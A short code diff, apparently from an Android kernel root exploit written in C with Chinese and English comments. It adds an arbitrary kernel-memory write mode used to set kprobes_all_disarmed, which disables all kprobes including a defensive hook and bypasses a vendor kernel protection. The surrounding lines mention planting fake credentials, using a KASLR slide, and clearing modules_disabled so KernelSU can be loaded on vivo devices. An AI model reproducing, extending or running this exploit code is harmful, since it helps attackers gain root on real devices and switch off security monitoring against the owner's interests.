@@ -2532,6 +2532,13 @@ static void run_plant(unsigned long long target, int tag, int mode,
             logf("[+] plant%d fake cred off=%#zx blob=%#zx sec=%#llx\n",
                  tag, off, blob, page + blob);
         }
+        else if (mode == 1)
+        {
+            /* 写任意 64 位值：parent 即写入值（小端）。
+             * 用于 kprobes_all_disarmed = 1（01 00 00 00 00 00 00 00），
+             * 后 7 字节写 0，尽量不破坏相邻 .bss 变量。 */
+            build_payload(payload, off, 1, target);
+        }
         else
         {
             build_payload(payload, off, 0, target);
@@ -3318,7 +3325,7 @@ int main(int argc, char **argv)
         /* 直接写 kprobes_all_disarmed 为非零值（fake 模式写 node 地址），
          * 一次性 disarm 所有 kprobe（含 hooks_defend），绕过 HKD 的 .data 依赖 */
         if (KPROBES_DISARM_STATIC &&
-            stage_write(KPROBES_DISARM_STATIC + g_slide, 2, "kprobes_disarm", raw, NULL))
+            stage_write(KPROBES_DISARM_STATIC + g_slide, 1, "kprobes_disarm", raw, NULL))
             park_forever("kprobes disarm failed");
         /* vivo: zero modules_disabled so the rooted child's ksud can
          * late-load kernelsu.ko (finit_module). Same proven-first ordering
